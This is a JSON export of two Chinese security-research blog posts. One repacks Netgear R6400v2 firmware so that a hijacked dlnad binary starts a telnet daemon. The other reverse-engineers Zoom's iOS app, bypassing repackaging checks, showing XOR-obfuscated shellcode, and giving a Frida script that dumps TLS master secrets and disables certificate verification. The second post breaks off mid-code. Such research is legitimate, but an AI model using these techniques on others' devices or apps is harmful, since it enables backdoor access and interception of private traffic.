{"pages":[],"posts":[{"title":"Netgear R6400v2 固件重打包","text":"周末看到网件出新安全公告了，然后把新固件拉下来看看手上的洞被补了没。 没有哈哈哈哈，但是新版固件中debug页面开启telnet的勾选框已经没有了，不知道是不是之前报的登录程序漏洞的原因。 没有telnet就不能调试，那得多难受，试着整一个出来。这里得提一下，网件官方可以下载到所有固件，并且都是不加密的，这点十分友好。既然有固件，那想添加功能通过重打包来实现就可以了。下面主要记录操作过程,就当是在记笔记。 先看固件结构： 12345678x@ubuntu  6400_104120  binwalk R6400v2-V1.0.4.120_10.0.91.chk DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------58 0x3A TRX firmware header, little endian, image size: 47222784 bytes, CRC32: 0xB9C3C9B8, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x20BD98, rootfs offset: 0x086 0x56 LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5276608 bytes2145746 0x20BDD2 Squashfs filesystem, little endian, version 4.0, compression:xz, size: 45075386 bytes, 1798 inodes, blocksize: 131072 bytes, created: 2021-09-03 09:27:39 三部分组成，0x3A长度的数据 +TRX 头 + LZMA 压缩的数据 + Squashfs 文件系统，其中开始的0x3A是网件自己的头，LZMA 压缩的是linux kernel， 最后是squash格式的文件系统。 通过对比多个固件，网件自己的头是可以分析出来个大概的： 123456x@ubuntu  6400_104120  hexdump -C R6400v2-V1.0.4.120_10.0.91.chk -n 5800000000 2a 23 24 5e 00 00 00 3a 01 01 00 04 78 0a 00 5b |*#$^...:....x..[|00000010 43 6f 0a 9f 00 00 00 00 02 d0 90 00 00 00 00 00 |Co..............|00000020 43 6f 0a 9f 0f bd 0a b5 55 31 32 48 33 33 32 54 |Co......U12H332T|00000030 30 30 5f 4e 45 54 47 45 41 52 |00_NETGEAR|0000003a 0-8字节是固定的， 9-0x10字节是固件的版本号 0x10-0x17, 0x20-0x27是checksum信息 0x18-0x1f是固件的大小 0x28-0x39是固件的设备相关信息 更具体的可以自己去分析一下packet文件，记得网上有人分析过。 TRX 的结构如下： 1234567struct trx_header { uint32_t magic; /* &quot;HDR0&quot; */ uint32_t len; /* Length of file including header */ uint32_t crc32; /* 32-bit CRC from flag_version to end of file */ uint32_t flag_version; /* 0:15 flags, 16:31 version */ uint32_t offsets[4]; /* Offsets of partitions from start of header */}; 将固件解包后在文件系统中翻了翻，发现busybox以及utelnetd相关文件都还在，只是web接口没了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960x@ubuntu  6400_104120  binwalk -Me R6400v2-V1.0.4.120_10.0.91.chk Scan Time: 2021-09-28 21:34:05Target File: /home/x/Documents/iot/firmware/netgear/fuckyou/6400_104120/R6400v2-V1.0.4.120_10.0.91.chkMD5 Checksum: bb55c02b824c5d2afbdf1f8788a62643Signatures: 411DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------58 0x3A TRX firmware header, little endian, image size: 47222784 bytes, CRC32: 0xB9C3C9B8, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x20BD98, rootfs offset: 0x086 0x56 LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5276608 bytes2145746 0x20BDD2 Squashfs filesystem, little endian, version 4.0, compression:xz, size: 45075386 bytes, 1798 inodes, blocksize: 131072 bytes, created: 2021-09-03 09:27:39Scan Time: 2021-09-28 21:34:14Target File: /home/x/Documents/iot/firmware/netgear/fuckyou/6400_104120/_R6400v2-V1.0.4.120_10.0.91.chk.extracted/56MD5 Checksum: 85dfc4101805b3eca170875f7418e335Signatures: 411DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------131072 0x20000 ASCII cpio archive (SVR4 with no CRC), file name: &quot;/dev&quot;, file name length: &quot;0x00000005&quot;, file size: &quot;0x00000000&quot;131188 0x20074 ASCII cpio archive (SVR4 with no CRC), file name: &quot;/dev/console&quot;, file name length: &quot;0x0000000D&quot;, file size: &quot;0x00000000&quot;131312 0x200F0 ASCII cpio archive (SVR4 with no CRC), file name: &quot;/root&quot;, file name length: &quot;0x00000006&quot;, file size: &quot;0x00000000&quot;131428 0x20164 ASCII cpio archive (SVR4 with no CRC), file name: &quot;TRAILER!!!&quot;, file name length: &quot;0x0000000B&quot;, file size: &quot;0x00000000&quot;278363 0x43F5B LZMA compressed data, properties: 0xC0, dictionary size: 0 bytes, uncompressed size: 64 bytes2314105 0x234F79 Certificate in DER format (x509 v3), header length: 4, sequence length: 12842314221 0x234FED Certificate in DER format (x509 v3), header length: 4, sequence length: 12883537773 0x35FB6D Certificate in DER format (x509 v3), header length: 4, sequence length: 12923537777 0x35FB71 Certificate in DER format (x509 v3), header length: 4, sequence length: 13043537781 0x35FB75 Certificate in DER format (x509 v3), header length: 4, sequence length: 13083903676 0x3B90BC Linux kernel version 2.6.363992328 0x3CEB08 CRC32 polynomial table, little endian4028004 0x3D7664 VxWorks symbol table, little endian, first entry: [type: initialized data, code address: 0xC04848C6, symbol address: 0xFFFF0012]4030056 0x3D7E68 CRC32 polynomial table, little endian4510908 0x44D4BC Unix path: /home/eric/R6400v2/V1.0.4.120_10.0.91/2020_12_24_BSP_6.37.15.7_R6400v2_Armor/components/opensource/linux/linux-2.6.36/arch/arm/i4638201 0x46C5F9 xz compressed data4751925 0x488235 Neighborly text, &quot;NeighborSolicits init(): can't add protocol&quot;4751942 0x488246 Neighborly text, &quot;NeighborAdvertisementsd protocol&quot;4754040 0x488A78 Neighborly text, &quot;neighbor %.2x%.2x.%pM lostename link %s to %s&quot;5154935 0x4EA877 LZMA compressed data, properties: 0xC0, dictionary size: 0 bytes, uncompressed size: 32 bytesScan Time: 2021-09-28 21:34:15Target File: /home/x/Documents/iot/firmware/netgear/fuckyou/6400_104120/_R6400v2-V1.0.4.120_10.0.91.chk.extracted/_56.extracted/43F5BMD5 Checksum: 3b5d3c7d207e37dceeedd301e35e2e58Signatures: 411DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------Scan Time: 2021-09-28 21:34:15Target File: /home/x/Documents/iot/firmware/netgear/fuckyou/6400_104120/_R6400v2-V1.0.4.120_10.0.91.chk.extracted/_56.extracted/4EA877MD5 Checksum: 70bc8f4b72a86921468bf8e8441dce51Signatures: 411DECIMAL HEXADECIMAL DESCRIPTION-------------------------------------------------------------------------------- x@ubuntu  6400_104120  find _R6400v2-V1.0.4.120_10.0.91.chk.extracted/squashfs-root/ -name &quot;*telnetd*&quot;_R6400v2-V1.0.4.120_10.0.91.chk.extracted/squashfs-root/bin/utelnetd_R6400v2-V1.0.4.120_10.0.91.chk.extracted/squashfs-root/usr/sbin/telnetd 那我们只要修改文件系统在启动的时候开启telnet就好了，虽然没有init相关脚本，但是我们在找一个没有参数的程序，做个”劫持“也能达到目的： 1234mv /usr/sbin/dlnad /usr/sbin/dlnaddecho &quot;#!/bin/sh&quot; &gt; /usr/sbin/dlnadecho &quot;/bin/utelnetd -p 12580 &amp;&quot; &gt;&gt; /usr/sbin/dlnadecho &quot;/usr/sbin/dlnadd &amp;&quot; &gt;&gt; /usr/sbin/dlnad 接下来就要考虑如何将固件重新打包并能够正常刷进路由器中，固件解包时，只要binwalk跑一下就完事了，但是重打包就相对麻烦一些。我们刚刚修改了squashfs文件系统，所以就需要重新打包squashfs文件系统，但mksquashfs在打包时，有很多细节的参数和配置，这些参数和配置将直接影响我们重打包的系统是否可以正常运行，此外，还有设备只能识别特定版本的mksquashfs打包出来的固件。最后，TRX头是个什么我们也还得弄弄清楚。 这里又得说一下，网件的开发者是相当的友好，不仅提供固件的下载，还提供了所有版本固件中的GPL部分代码以及编译环境。我们下个对应版本的包，参考下它自己是怎么打包的。 1wget https://www.downloads.netgear.com/files/GPL/R6400v2-V1.0.4.120_10.0.91_src.zip 在下载的GPL代码中，tools 文件夹中存放着打包时用到的工具， src/router 下面是路由器相关的，我们看一下Makefile中的打包部分也就知道该怎么做了。在Makefile中搜索mksquashfs，成功定位打包部分代码： 可以看到文件系统的制作部分很简单，直接就是用默认的squashfs-4.2编译之后直接制作： 1mksquashfs xxx xxx -noappend -all-root 但是我们在之前使用binwalk看的时候明明发现用的是xz压缩方式，所以我们自己做的时候也还是用xz压缩吧。Makefile中制作完文件系统后还有一些其它操作，但是这里我们不需要，我们原封不动的将制作好的文件系统写回原来的位置即可。所以只需要关注下面制作chk部分： 12345678########################################### ### Create .chk files for Web UI upgrade ## cd $(PLATFORMDIR) &amp;&amp; touch rootfs &amp;&amp; \\ ../../../tools/packet -k linux.trx -f rootfs -b $(BOARDID_FILE) \\ -ok kernel_image -oall kernel_rootfs_image -or rootfs_image \\ -i $(fw_cfg_file) &amp;&amp; \\ rm -f rootfs &amp;&amp; \\ ~~~~cp kernel_rootfs_image.chk $(FW_NAME)_`date +%m%d%H%M`.chk 这里用的是自己的packet工具来制作，我们看下对应的参数都是什么意思： 12345./packet --helpVersion: 2.0usage: packet -k [kernel file name] -f [rootfs file name] -b [board id file name] -ok [output kernel file name] -oall [output kernel and rootfs file name] -or [output rootfs file name] -i [configure file path/name]Example:packet -k linux.trx -f rootfs -b compatible.txt -ok kernel -oall kernel_rootfs -or rootfs -i ../../../project/acos/include/ambitCfg.h -k 是kernel文件 -f 是文件系统的名字 -b 是设备id相关信息 -i 是配置文件 kernel我们不用动，文件系统已经打包好了，那我们这里只要关注一下设备id以及配置文件即可。这两个文件在提供的GPL压缩包中都有， find一下就好。由于网件自己的头会通过packet生成，所以我们只要关心TRX头中的crc32以及size字段即可。 所以最终的重打包步骤为： 准备好修改过的文件系统以及原始固件 将文件系统使用mksquashfs打包 从原视固件中提取TRX header+linux kernel， 将新的squashfs填充到后面 修改crc32字段以及filesize字段 使用packet工具生成网件自己的头，生成最终的chk文件 最终使用的打包脚本以及对应说明都放在github上了。 在完成这些工作后我又想起来一个问题，我手里不是有一个很好用的命令执行还没提吗？直接用它开启telnet不香嘛？？！ 最后，如果了解固件的启动流程，需要对bootloader做分析，但是我们又拿不到bootloader，该怎么办呢？ 有了telnet就好办了，自己编个dd上去，然后查看分区信息之后将boot部分dump 出来 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# cat /proc/mtd dev: size erasesize namemtd0: 00080000 00020000 &quot;boot&quot;mtd1: 00180000 00020000 &quot;nvram&quot;mtd2: 06b00000 00020000 &quot;linux&quot;mtd3: 068f4268 00020000 &quot;rootfs&quot;mtd4: 00080000 00020000 &quot;board_data&quot;mtd5: 00100000 00020000 &quot;POT1&quot;mtd6: 00100000 00020000 &quot;POT2&quot;mtd7: 002c0000 00020000 &quot;T_Meter1&quot;mtd8: 002c0000 00020000 &quot;T_Meter2&quot;mtd9: 00080000 00020000 &quot;ML1&quot;mtd10: 00080000 00020000 &quot;ML2&quot;mtd11: 00080000 00020000 &quot;ML3&quot;mtd12: 00080000 00020000 &quot;ML4&quot;mtd13: 00080000 00020000 &quot;ML5&quot;mtd14: 00080000 00020000 &quot;ML6&quot;mtd15: 00080000 00020000 &quot;ML7&quot;mtd16: 00080000 00020000 &quot;QoSRule&quot;mtd17: 00100000 00020000 &quot;DebugMsg&quot;mtd18: 03900000 00020000 &quot;brcmnand&quot;mtd19: 00500000 00020000 &quot;OpenVPN&quot;# dmesg |egrep '0x[a-z0-9]{12}'[ 2.060000] 0x000000000000-0x000000080000 : &quot;boot&quot;[ 2.070000] 0x000000080000-0x000000200000 : &quot;nvram&quot;[ 2.070000] 0x000000200000-0x000006d00000 : &quot;linux&quot;[ 2.080000] 0x00000040bd98-0x000006d00000 : &quot;rootfs&quot;[ 2.090000] 0x000007200000-0x000007280000 : &quot;board_data&quot;[ 2.090000] 0x000007280000-0x000007380000 : &quot;POT1&quot;[ 2.100000] 0x000007380000-0x000007480000 : &quot;POT2&quot;[ 2.100000] 0x000007480000-0x000007740000 : &quot;T_Meter1&quot;[ 2.110000] 0x000007740000-0x000007a00000 : &quot;T_Meter2&quot;[ 2.120000] 0x000007a00000-0x000007a80000 : &quot;ML1&quot;[ 2.120000] 0x000007a80000-0x000007b00000 : &quot;ML2&quot;[ 2.130000] 0x000007b00000-0x000007b80000 : &quot;ML3&quot;[ 2.130000] 0x000007b80000-0x000007c00000 : &quot;ML4&quot;[ 2.140000] 0x000007c00000-0x000007c80000 : &quot;ML5&quot;[ 2.140000] 0x000007c80000-0x000007d00000 : &quot;ML6&quot;[ 2.150000] 0x000007d00000-0x000007d80000 : &quot;ML7&quot;[ 2.150000] 0x000007d80000-0x000007e00000 : &quot;QoSRule&quot;[ 2.160000] 0x000007e00000-0x000007f00000 : &quot;DebugMsg&quot;[ 2.360000] Bad eraseblock 105 at 0x000000d20000[ 2.380000] Bad eraseblock 266 at 0x000002140000[ 2.410000] Bad eraseblock 948 at 0x000007680000[ 2.420000] 0x000003400000-0x000006d00000 : &quot;brcmnand&quot;[ 2.430000] 0x000006d00000-0x000007200000 : &quot;OpenVPN&quot;# dd if=/dev/mtd0 of=boot 传送门：重打包脚本 参考链接： Netgear 固件下载 Netgear GPL 开源软件及工具链下载 救砖教程","link":"/2021/09/29/Netgear-R6400v2-%E5%9B%BA%E4%BB%B6%E9%87%8D%E6%89%93%E5%8C%85/"},{"title":"Zoom 简单分析","text":"最近闲来无事儿，找个app学习学习想起之前某个机缘巧合的情况下，与zoom的大佬们有过简单的交流,大佬们还是很强的。就它吧！ Zoom Version: iOS 5.6.1(172) 0x00 去除重打包检测相关直接使用MonkeyDev 重打包，提示‘LLVM Profile Error: “default.profraw”‘并直接退出 直接丢进ida中看， 有检测embedded.mobileprovision 文件，同时瞄到ptrace检测调试， 伪代码如下： 1234567891011121314v4 = objc_msgSend(&amp;OBJC_CLASS___NSBundle, &quot;mainBundle&quot;);v5 = objc_msgSend(v4, &quot;pathForResource:ofType:&quot;, CFSTR(&quot;embedded&quot;), CFSTR(&quot;mobileprovision&quot;));if ( objc_msgSend(v5, &quot;length&quot;) ) exit(0);v6 = (__int64)dlopen(0LL, 10);if ( v6 ){ v14 = (void *)v6; v15 = dlsym((void *)v6, &quot;ptrace&quot;); if ( v15 ) ((void (__fastcall *)(signed __int64, _QWORD, _QWORD, _QWORD))v15)(31LL, 0LL, 0LL, 0LL); v6 = dlclose(v14);}v16 = sub_1000356A0(v6, v7, v8, v9, v10, v11, v12, v13, v22, v23, v24); 绕过也很简单： 123456789101112%hook NSBundle- (NSString *)pathForResource:(NSString *)name ofType:(NSString *)ext{ if([name isEqualToString:@&quot;embedded&quot;] &amp;&amp; [ext isEqualToString:@&quot;mobileprovision&quot;]){ NSLog(@&quot;find embedded.mobileprovision...&quot;); return nil; }else{ return %orig(); }}%end 绕过以后却一直提示这个 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647Main Thread Checker: UI API called on a background thread: -[UIApplication applicationState]PID: 1829, TID: 61332, Thread name: com.apple.CoreMotion.MotionThread, Queue name: com.apple.root.default-qos.overcommit, QoS: 0Backtrace:4 libobjc.A.dylib 0x0000000224f1b6f4 &lt;redacted&gt; + 565 CoreMotion 0x000000022b695d9c CoreMotion + 2943006 CoreMotion 0x000000022b6962cc CoreMotion + 2956287 CoreMotion 0x000000022b6961dc CoreMotion + 2953888 CoreMotion 0x000000022b6c401c CoreMotion + 4833569 CoreMotion 0x000000022b6c4060 CoreMotion + 48342410 CoreFoundation 0x0000000225caa27c &lt;redacted&gt; + 2811 CoreFoundation 0x0000000225ca9b64 &lt;redacted&gt; + 27612 CoreFoundation 0x0000000225ca4e58 &lt;redacted&gt; + 227613 CoreFoundation 0x0000000225ca4254 CFRunLoopRunSpecific + 45214 CoreFoundation 0x0000000225ca4f88 CFRunLoopRun + 8415 CoreMotion 0x000000022b6c39f4 CoreMotion + 48178016 libsystem_pthread.dylib 0x0000000225922908 &lt;redacted&gt; + 13217 libsystem_pthread.dylib 0x0000000225922864 _pthread_start + 4818 libsystem_pthread.dylib 0x000000022592adcc thread_start + 4//------------------------2021-05-14 21:17:42.684256+0800 Zoom[2148:69541] old data has cpoied done=================================================================Main Thread Checker: UI API called on a background thread: -[UIApplication applicationState]PID: 2148, TID: 69718, Thread name: com.apple.CoreMotion.MotionThread, Queue name: com.apple.root.default-qos.overcommit, QoS: 0Backtrace:4 libobjc.A.dylib 0x0000000224f1b6f4 &lt;redacted&gt; + 565 CoreMotion 0x000000022b695d9c CoreMotion + 294300...2021-05-14 21:17:42.964460+0800 Zoom[2148:69718] [reports] Main Thread Checker: UI API called on a background thread: -[UIApplication applicationState]PID: 2148, TID: 69718, Thread name: com.apple.CoreMotion.MotionThread, Queue name: com.apple.root.default-qos.overcommit, QoS: 0Backtrace:4 libobjc.A.dylib 0x0000000224f1b6f4 &lt;redacted&gt; + 565 CoreMotion 0x000000022b695d9c CoreMotion + 2943006 CoreMotion 0x000000022b6962cc CoreMotion + 295628...(lldb) bt* thread #20, name = 'com.apple.CoreMotion.MotionThread', stop reason = EXC_BAD_ACCESS (code=1, address=0x0) * frame #0: 0x0000000000000000 frame #1: 0x0000000105731a6c libMainThreadChecker.dylib`__ASSERT_API_MUST_BE_CALLED_FROM_MAIN_THREAD_FAILED__ + 812 frame #2: 0x0000000105731e0c libMainThreadChecker.dylib`checker_c + 412 frame #3: 0x00000001057316b0 libMainThreadChecker.dylib`trampoline_c + 76 frame #4: 0x00000001056f145c libMainThreadChecker.dylib`handler_start + 52 frame #5: 0x00000001056fce7c libMainThreadChecker.dylib`__trampolines + 47600 frame #6: 0x0000000224f1b6f4 libobjc.A.dylib`-[NSObject performSelector:] + 56 frame #7: 0x000000022b695d9c CoreMotion`___lldb_unnamed_symbol1461$$CoreMotion + 908...(phone's lldb) 对于强迫症来说可太难顶了，很快啊，我啪就给丫关了： 对抗 检测不放在start中，可以多点多次检测 检测重打包(检测调试状态 也类似) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//简单版本：__attribute__((constructor)) static void (*__result)();// 垃圾指令 // ...// __asm__(&quot;mov x0, #0\\\\n&quot;// &quot;mov x1, #0\\\\n&quot;// &quot;mov sp, x1\\\\n&quot;// &quot;mov x29, x1\\\\n&quot;// &quot;mov x30, x1\\\\n&quot;// &quot;mov w16, #1\\\\n&quot;// &quot;svc #0x80\\\\n&quot;);// 也可再加一些垃圾指令// char asd[]=&quot;\\\\xE0\\\\x03\\\\x08\\\\xAA\\\\x00\\\\x10\\\\x80\\\\xD2\\\\x01\\\\x10\\\\x80\\\\xD2\\\\x00\\\\x00\\\\x80\\\\xd2\\\\x01\\\\x00\\\\x80\\\\xd2\\\\x3f\\\\x00\\\\x00\\\\x91\\\\xfd\\\\x03\\\\x01\\\\xaa\\\\xfe\\\\x03\\\\x01\\\\xaa\\\\x30\\\\x00\\\\x80\\\\x52\\\\x01\\\\x10\\\\x00\\\\xd4&quot;;char dsa[]=&quot;\\\\xB5\\\\x56\\\\x5D\\\\xFF\\\\x55\\\\x45\\\\xD5\\\\x87\\\\x54\\\\x45\\\\xD5\\\\x87\\\\x55\\\\x55\\\\xD5\\\\x87\\\\x54\\\\x55\\\\xD5\\\\x87\\\\x6A\\\\x55\\\\x55\\\\xC4\\\\xA8\\\\x56\\\\x54\\\\xFF\\\\xAB\\\\x56\\\\x54\\\\xFF\\\\x65\\\\x55\\\\xD5\\\\x07\\\\x54\\\\x45\\\\x55\\\\x81\\\\x55&quot;;__attribute__((constructor)) static void* __objc_alloc(){ void* ptr=mmap(0, 0x100, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE , -1, 0); if (ptr == MAP_FAILED) { return nil; } memcpy(ptr, dsa, (sizeof(dsa)&lt;0x100?sizeof(dsa):0x99)); char* pptr=(char* )ptr; for (int k=0; k&lt;(sizeof(dsa)&lt;0x100?sizeof(dsa):0x99); k++) { pptr[k]=pptr[k]^0x55; } int i=mprotect(ptr, 0x100, PROT_EXEC); if (i!=0){ return nil; } __result=ptr; return __result;}__attribute__((constructor)) static void _stack_chk_success(){ __objc_alloc(); NSString* BASE_PATH = [[NSBundle mainBundle] bundlePath]; NSFileManager *myFileManager = [NSFileManager defaultManager]; NSDirectoryEnumerator *myDirectoryEnumerator = [myFileManager enumeratorAtPath:BASE_PATH]; for (NSString *path in myDirectoryEnumerator.allObjects) { NSData *data = [path dataUsingEncoding:NSUTF8StringEncoding]; NSString *base64String = [data base64EncodedStringWithOptions:NSDataBase64EncodingEndLineWithLineFeed];#if 1 //embedded.mobileconfig if ([base64String isEqualToString:@&quot;ZW1iZWRkZWQubW9iaWxlcHJvdmlzaW9u&quot;]){ // __result(); pthread_t thread; pthread_create(&amp;thread, NULL, __result, NULL); }#endif }} 最近看到一个开源库做安全性检测的https://github.com/securing/IOSSecuritySuite， 粗略看了下检测的还算OK，做开发的朋友们有没有用过的 &lt;wink～&gt; ETC： 其实除了重打包检测和反调试以外，还有越狱检测，但是越狱检测可以直接使用现有的工具（比如Liberty…）直接绕过，这里就不多说了。 0x01 抓包解决了相关检测问题后，就可以直接调试应用了。既然要看登陆过程，那么抓包就是不可避免的一个步骤。先尝试了直接使用frida hook ssl read/write ，结果什么也没有，就很郁闷。尝试使用Charles设置代理抓包，结果发现： 原来是存在证书校验，具体可以使用wireshark查看： 可以看出是在server hello 完成后客户端检测到证书不匹配，既然问题出在客户端，那么就还是好解决的，拿现成的工具比如ssl kill switch直接干掉就完了，完事收工。 哈哈哈哈，当然不可能这么简单，不然还写什么写。用了ssl kill switch 后也是不起作用的，然后又试了自己hook NSURLSession、Security等系列函数中的检测部分，结果也还是不行，我emo了家人们，多吓人呐。当时在这里卡了挺久，没想到什么原因，更别提解决办法了，就想着先用ida搜搜关键字看能不能找到些线索。 1. 明确无法抓包的原因在浏览字符串的时候看到了openssl相关关键字，然后搜了下，还挺多： 瞬间就有了点什么想法，立马扭头跟大哥JKSun请教一番。该说不说，大哥就是大哥，很快就帮我确认了我的想法，这丫静态编译的openssl进去，并非使用系统库，难怪各种hook都不起作用。同时还看到在项目目录下有curl7.74.0相关代码目录，这里留意下暂且不表。 2. 解决方式2.1 一些奇妙的知识HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。这里https的原理部分不打算细讲，简单说说SSL的握手部分，搞明白这部分是我们后面操作的基础。闲话不多说，先看张图： 这张图讲解了tls的握手流程，我们这里需要注意几点： client向server端发送ClientHello数据包（包含支持的ssl版本等基础信息，以及一个随机数 random_num_client） server端在收到ClientHello后会向client发送ServerHello数据包（包含最终使用ssl配置等相关信息、server的publicKey和证书，以及一个随机数 random_num_server（如果设置了双向校验相关选项，这里server还会向client发送ClientCertificateRequest，后续会校验）） client收到ServerHello相关信息后，会使用RSA或DH算法生成第三个随机数（称之为Premaster Secret）然后使用server的publicKey加密后发送给server端 client和server都知道这三个随机数，且PreMasterSecret 在传输过程中是加密的。利用这三个随机数生成MasterSecret进而生成后续数据传输中使用的SessionKey，我们用下面这张图来表示 想要解开https数据包，我们就得获得这个握手过程中的PreMasterSecret 或者是MasterSecret。 在握手过程中，除了交换random 生成（Pre）MasterSecret 之外，还有个重要的任务就是进行身份认证，也就是我们常说的证书校验。身份认证也分两种：单向认证和双向认证，一般情况下只需要进行单向认证也就是client确认server的身份即可，对于一些重要的业务场景则需要client和server互相确认身份。 2.2 具体方式自己编译一份对应版本的openssl库，通过特征比对找到对应函数，尔后便可以解决抓包。机灵的小伙伴可以使用ida的sdk生成对应的sig文件，然后就可以直接识别了，我当时好像不太聪明的样子一个一个手动找的特征QaQ 结合上面奇妙的知识，我们可以用的方法就多，具体操作有： 通过hook获取master key 可以解开https的加密数据 –&gt; 可以直接使用wireshark 抓包 绕过证书校验部分， 用burp等工具可以直接抓包 –&gt; 通过burp等代理抓包工具抓包 hook ssl read/write 直接获取通讯数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105//0x01 get client_random, master_secretvar clientvar master// zoom_561_172// 0xB945B8// 先通过0xB61518 tls1_PRF 确定版本相关信息，再直接hook 获取master scretInterceptor.attach(base.add(0xB6176C), { onEnter: function (args) { var oob = Memory.readU64(args[0].add(0xa8)) client = oob.add(0xb8) master = args[1] }, onLeave: function (retval) { console.log(&quot;CLIENT_RANDOM&quot;, arraybuffer2hexstr(Memory.readByteArray(ptr(client), 32)), arraybuffer2hexstr(Memory.readByteArray(ptr(master), 48))) }})//0x02 bypass 证书校验//0x100B39B4C -- ssl_verify_cert_chain Interceptor.attach(base.add(0xB39B4C), { onEnter: function (args) { console.log(Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join('\\n') + '\\n'); console.log('call ssl_verify_cert_chain') }, onLeave: function (retval) { console.log(&quot;ret:&quot;, retval) retval.replace(1) }})function ssl_session_get_id_func(ssl, len) { if (len) { var lenn = Memory.readU64(ptr(ssl.add(0x150))) Memory.writeU32(len, lenn) } return ptr(ssl.add(0x158))}// ; SSL_SESSION *__cdecl SSL_get_session(const SSL *ssl)// __text:0000000000025E64 EXPORT _SSL_get_session// __text:0000000000025E64 _SSL_get_session ; CODE XREF: _SSL_copy_session_id+18↑p// __text:0000000000025E64 ; _ssl_validate_ct+D4↑p ...// __text:0000000000025E64 00 88 42 F9 LDR X0, [X0,#0x510]// __text:0000000000025E68 C0 03 5F D6 RET// __text:0000000000025E68 ; End of function _SSL_get_sessionfunction ssl_get_session_func(ssl) { return Memory.readU64(ssl.add(0x510))}function getSslSessionId(ssl) { var session = ssl_get_session_func(ssl); if (session == 0) { return 0; } var len = Memory.alloc(4); var p = ssl_session_get_id_func(session, len); len = Memory.readU32(len); var session_id = &quot;&quot;; for (var i = 0; i &lt; len; i++) { session_id += (&quot;0&quot; + Memory.readU8(p.add(i)).toString(16).toUpperCase()).substr(-2); } return session_id;}function arraybuffer2hexstr(buffer) { var hexArr = Array.prototype.map.call( new Uint8Array(buffer), function (bit) { return ('00' + bit.toString(16)).slice(-2) } ) return hexArr.join('');}// 0x05 SSL_read 0xB40E38 Interceptor.attach(base.add(0xB40E38), { onEnter: function (args) { this.message = &quot;SSL_read&quot; this.buf = args[1] console.log('call 0xB40E38 ssl_read', args[2]) console.log(&quot; -&gt; ssl_session_id is:&quot;, getSslSessionId(args[0])) }, onLeave: function (retval) { console.log(&quot;SSL_read ret:&quot;, retval) var byteArray = Memory.readByteArray(this.buf, parseInt(retval)) console.log(byteArray, '\\n') }})// 0x06 SSL_write 0xB40FECInterceptor.attach(base.add(0xB40FEC), { onEnter: function (args) { //bad command console.log('call 0xB40FEC ssl_write', args[0], args[2]) console.log(&quot; -&gt;ssl_session_id is:&quot;, getSslSessionId(args[0])) var byteArray = Memory.readByteArray(args[1], parseInt(args[2])) console.log(byteArray) }, onLeave: function (retval) { console.log(&quot;SSL_Write ret:&quot;, retval, '\\n') }}) 经过测试三种方式都是可以正常抓包的，这里贴一下抓包内容： 通过zoom.com 重定向到zoom.us，但是抓包的内容是一样的。下面我们就登陆部分做个简单分析 0x02 登陆字段分析登陆字段的计算部分都是用的C++写的，对这种无符号的代码，分析起来也没什么技巧，就是头铁。在识别加密算法的时候，由于经验不足，就直接上搜索引擎上去搜关键变量，然后结合openssl源码找特征。 总之能hook的就hook，不能hook的再调试分析。 通过捕获的数据包可以看到login相关字段如下： ZM-CID==deviceId==cid==hash_macaddress Cookies ==&gt;ZM-SESS-KEY + srid(SaaSbeeTestMode00123578) password ecp ZM-DID 在分析这些字段之前，我们还需要一个小tips，zoom中使用了自定义的string结构，姑且命名为CmmCstringT，结构大致如下 1234567891011121314151617181920// --------------------------------------------------// |00|01|02|03|04|05|06|07|08|09|0a|0b|0c|0d|0e|0f|// --------------------------------------------------// addr Cmm::CStringT | str or ptr2str// len | |flagQWORD *__fastcall Cmm_CStringT(_QWORD *a1, __int64 a2){ _QWORD *v2; // x20 v2 = a1; *a1 = &amp;off_10268E010; a1[1] = 0LL; a1[2] = 0LL; a1[3] = 0LL; if ( a2 ) std::__1::basic_string&lt;char,std::__1::char_traits&lt;char&gt;,std::__1::allocator&lt;char&gt;&gt;::assign(); return v2;} 我们hook这个Cmm_CStringT函数，可以得到蛮多有趣的消息。 hash_macaddress对于hash_macaddress字段直接hook 对应关键字即可分析出流程， 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960void __fastcall generateDeviceIdentifier(void *bundleIdentifier){ void *v1; // x19 __int64 v2; // x22 char *v3; // x19 void **v4; // [xsp+10h] [xbp-150h] __int64 v5; // [xsp+18h] [xbp-148h] __int64 (__fastcall *v6)(); // [xsp+20h] [xbp-140h] void *v7; // [xsp+28h] [xbp-138h] __int64 *v8; // [xsp+30h] [xbp-130h] __int64 v9; // [xsp+38h] [xbp-128h] __int64 *v10; // [xsp+40h] [xbp-120h] __int64 v11; // [xsp+48h] [xbp-118h] void *v12; // [xsp+50h] [xbp-110h] __int64 v13; // [xsp+58h] [xbp-108h] char v14[16]; // [xsp+C0h] [xbp-A0h] __int128 v15; // [xsp+D0h] [xbp-90h] __int128 v16; // [xsp+E0h] [xbp-80h] __int128 v17; // [xsp+F0h] [xbp-70h] char v18; // [xsp+100h] [xbp-60h] char v19[32]; // [xsp+108h] [xbp-58h] if ( bundleIdentifier ) { v1 = bundleIdentifier; if ( objc_msgSend(bundleIdentifier, &quot;length&quot;) ) { v9 = 0LL; v10 = &amp;v9; v11 = 584383987712LL; v12 = &amp;unk_10249643D; CC_SHA256_Init(&amp;v13); v4 = _NSConcreteStackBlock; v5 = 0xC2000000LL; v6 = sub_100312B08; v7 = &amp;unk_102697FC0; v8 = &amp;v9; objc_msgSend(v1, &quot;enumerateByteRangesUsingBlock:&quot;, &amp;v4); CC_SHA256_Final(); v2 = 0LL; v18 = 0; v16 = 0u; v17 = 0u; 